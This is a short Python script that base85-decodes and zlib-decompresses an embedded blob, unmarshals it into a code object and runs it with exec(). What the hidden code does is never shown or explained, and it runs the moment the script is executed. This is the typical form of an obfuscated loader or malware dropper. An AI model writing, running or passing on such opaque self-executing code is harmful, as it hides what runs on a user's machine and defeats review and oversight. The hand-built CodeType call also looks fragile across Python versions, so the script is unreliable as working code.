import base64
import marshal
import zlib
import types

def decrypt_code():
    encoded = b'c$|Gz&u<(x6t+D-c6PD}1zIQ)R7<&JE3#50imIrsKoxL{Dgi>>%P?6x=`^!5gY6+?wJU*=(iSNc2?-&pN}EHGIG`d9jex5C5BLLor3>k)_gu=eXOi6{g&FzTetz$L9>3>r{zCg63))-I#K#~gqBusaqQ@<4deS1Mw_29z?UoHaiJgwyaxr=jQH$DZh}x^9RiO@b*HFu2Ra#jhyve*(gu&~5(;D6*jXBrA%K0#f(xknAJKoNAra>^Ix6mTYq7_P*O)Y3P#S5;1aaM85DZ;9W3oGv=ZN8Gpl+P(YO0rxA3sKC}M4HRpiOZSHdD13hkku0QyoUV~L=THv4-H_)lxz@cy#(L(BI;v_dq@M*%DQ!<)+aqOARDM}eT1lIBO9$+7$x3GB#tj*jP!dEnzVWrtx|v0>f6#DI6Zp<_Z{gDDm@2AuJi`go(rQ2o#<6=B3ip;^*zACbh5;nG+2Jm+km(S&@S#lo1jxYd=uRwtDvPG9L_WOI((F0FQ4I8gW;VoFRaK*Y4Z1XS0DaycXw$v3whY7j}C9PzIFfG;g#Ek-PY!v;r+G!)?>$8m|y*U-2CyqYr`9N9({iO@xAN2t_n9FVb~PcqB|L|B6W;5vlWGT*U9C=%xS0+4^~ndC5v-i?~ITfM(32xK4b0f#i)~|T-N79!QOnsFK3;Qi%Vg=GwsIF{LWaeWK8%zWeau63|;`S*>q#p?8_iAT0dJ4w{dx1?X;6|CWKKJK+XBnr@&o1mL3gbS^~$$RKqs4RpCB8iqk0LQU+$FPcu$KDyByf3ZtS_i)}a0gU1Ijn%+G_9i!P!gOD$_(>#%{?`pDCq)EJTaA9eAkN!ZYBu?95EJhAOhV3O0b=gR@5QmFn7P>zesGTN4j#(vPhmB1?4f#Het{$y=%AT}#%#I5gM+r;PkupwF8P1OxamD~bJY`=jj`fOJX!yP^r0KoI(C`&r&R>DLEUI|8`D<}whQHl?_~6#?=kJHtewnQ|YQQBTizBJ*G-HXfISZ+(=uB&(sg&7N4$V86P_`}!<?R%La*JwGRVb&Tj+C>^BMDswRW2J<ZtDx;fKYfr*~Vm2%b>)d${&@C@<%nMDrIG=sojfZzV0W)>kw~ybd_qQfk}WSLZJ=p%3*wn`1s`~HQTrJODy7g+lP+SK=+*0Jvzp=&G8ToJlAlQ7nrmKf%1c(lhQoa<601Wl814*QiIx(QM<!{hp4h(L;Se@;QC(isuots(84tXf{$UN+w=F(l<w@%_`4t^x{Ni2uj4-Iq02=7rl_+{a4`dFr5?;JJs(&bn&34(<I66z$_Cg`1oT;*%a1~|al$MMV)OR!$|jK11ZASlqfEjN&15Y<24d^SFABSVepnlKE@%<l>`N@px@0EpdNVTxi{>Z5v5fxB*Wmd7d<y?P4{kH?uwZKHZN8XySRyazDOa_SQcVs<r+j0i=fWIaaoBpZ$}O-PM7devY8$h?Nl<ntjFPkZaD5OpJcSQoj~vGQq+W%T>-8Xj`$JN}k7&PVwRm2O69x#V462Tkotzq1{@Q<}U3q7U+Bv8H65<7udk+^c;1lnZ=lR%v@-J$rwTl'
    compressed = base64.b85decode(encoded)
    marshalled = zlib.decompress(compressed)
    code = marshal.loads(marshalled)
    return types.CodeType(
        code.co_argcount, code.co_posonlyargcount, code.co_kwonlyargcount,
        code.co_nlocals, code.co_stacksize, code.co_flags, code.co_code,
        code.co_consts, code.co_names, code.co_varnames, code.co_filename,
        code.co_name, code.co_firstlineno, code.co_lnotab, code.co_freevars,
        code.co_cellvars
    )

exec(decrypt_code())
